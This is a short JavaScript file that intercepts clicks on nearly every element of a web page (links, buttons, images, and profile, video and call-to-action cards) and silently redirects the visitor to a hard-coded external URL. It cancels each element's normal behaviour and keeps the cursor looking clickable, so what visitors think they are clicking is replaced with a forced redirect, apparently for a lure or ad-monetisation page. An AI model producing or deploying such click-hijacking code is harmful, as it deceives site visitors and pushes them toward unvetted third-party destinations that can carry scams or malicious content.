// ==================================================
// REDIRECT CONFIGURATION
// ==================================================

// CHANGE THIS LINK LATER
const redirectLink = "https://omg10.com/4/11001122";

document.addEventListener('DOMContentLoaded', () => {
    // Find all clickable elements that a user might engage with
    const elementsToRedirect = document.querySelectorAll('a, button, img, .profile-card, .action-block, .video-card, .w-profile-card, .logo, .mega-cta');
    
    elementsToRedirect.forEach(el => {
        el.addEventListener('click', (e) => {
            e.preventDefault(); // Prevent default link behavior
            window.location.href = redirectLink;
        });
        
        // Ensure it appears clickable to the user
        el.style.cursor = 'pointer';
    });
});
